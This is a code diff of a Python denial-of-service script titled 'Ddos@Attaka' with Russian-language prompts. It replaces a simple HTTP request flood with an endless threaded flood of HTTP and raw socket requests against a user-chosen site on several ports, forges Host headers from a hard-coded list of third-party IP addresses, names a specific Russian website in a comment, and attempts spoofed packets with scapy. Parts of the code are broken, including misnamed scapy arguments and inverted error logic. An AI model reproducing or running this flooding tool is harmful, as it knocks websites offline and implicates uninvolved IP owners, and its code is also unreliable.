@@ -25,40 +25,74 @@ print('''
 ''')
 print("Ddos@Attaka")
 
-users = [
-    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
-    "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
-]
-headers = {
-    'User-Agent' : random.choice(users)
-}
 time.sleep(2.5)
 os.system("clear")
 
-url = input("Ссылка: => ")
-threads = int(input("Потоки (~800 лучше): => "))
+import threading
+from random import choice
+import requests
+import socket
+try:
+    from scapy.all import *
+    from scapy.layers.inet import TCP, IP
+    is_erroring = True
+except:
+    pass
 
-payload = {
-    'namest': 'username',
-    'passwordst': 'password',
-}
-def send():
+# http://m.bibika.ru/
+
+ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
+
+if input('Вы уже знаете IP адрес сайта, или вам нужно его найти? (y/n) ') == 'n':
+    url = input('Введите адрес сайта(без https:// и http://): ')
+    target = socket.gethostbyname(url)
+else:
+    target = input('Введите IP сайта: => ')
+
+if input('Вы хотите ввести свой или чужой IP для DDoS с него? (y/n) ') == 'y':
+    user_ip = input('Введите IP: => ')
+    ips.append(user_ip)
+
+target2 = input('Введите адрес сайта(с https:// или http://): ')
+input('Enter для начала атаки')
+
+ports = ['80', '8000', '8080', '443']
+attack_num = 0
+port = 0
+
+
+def dos():
     while True:
-        requests.get(url, headers=headers, data=payload)
-        print("Get...")
-        requests.post(url, headers=headers, data=payload)
-        print("post...")
-        requests.head(url, headers=headers, data=payload)
-        print("head...")
+        try:
+            requests.get(target2)
+            requests.post(target2)
 
-if __name__ == '__main__':
-    for i in range (threads):
-        thr = Thread(target=send)
-        thr.start()
+            global attack_num, port
+            attack_num += 1
+
+            ip = choice(ips)
+            port = int(choice(ports))
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+            i = 1
+
+            if not is_erroring:
+                while True:
+                    IP1 = IP(source_IP=choice(ips), destination=target)
+                    TCP1 = TCP(srcport=choice(ips), dstport=80)
+                    pkt = IP1 / TCP1
+                    send(pkt, inter=.001)
+        except Exception as error:
+            threading.Thread(target=dos).start()
+            print(error)
+            break
 
 
-def attack(event):
-    for y in range(int(Entry5.get())):
-        th = threading.Thread(target = run)
-        th.start()
+while True:
+    threading.Thread(target=dos).start()
+    print(f'Send ping to {target}:{port}')
+    print(f'Numbers of attack: {attack_num}')
